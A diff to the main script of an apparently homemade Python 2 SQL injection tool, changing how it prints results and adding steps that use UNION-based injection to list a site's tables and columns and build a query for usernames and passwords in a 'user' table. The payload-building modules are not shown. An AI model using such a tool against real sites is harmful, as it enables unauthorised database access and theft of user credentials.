@@ -11,6 +11,7 @@
 
 import os, sys, urllib2
 import builder, datastore, injector, scanner, parser, reporter
+import pprint
 import json
 
 if __name__ == '__main__':
@@ -36,21 +37,21 @@ if __name__ == '__main__':
     num_columns = fang.get_num_columns(page) 
     report.columns_in_statement(num_columns)
     magic_num = int(fang.get_visible_param(page))
-    print 'Magic Param','\t', magic_num
+    print '\tMagic Param','\t', magic_num
 
     # Get DB data
     print '\n### Basic DB Info ###'
     data = fang.injection(page, build.union(num_columns, magic_num)) 
     report.db_info(parse.db_values(data))
     data = fang.injection(page, build.schema_union(num_columns, magic_num)) 
-    print parse.information_schema(data)
+    print '### Interesting Tables ###'
+    report.tables(parse.information_schema(data))
 
     # Get table data
     print '\n### DB Table Info ###'
-    data = fang.injection(page, build.tables(num_columns, magic_num)) 
-    print parse.table(data)
-
-
+    data = fang.injection(page, build.columns(num_columns, magic_num)) 
+    report.columns(parse.table_for_columns(data))
+    print build.values(num_columns, magic_num, 'user', ['user_username', 'user_password'])
 
 
 
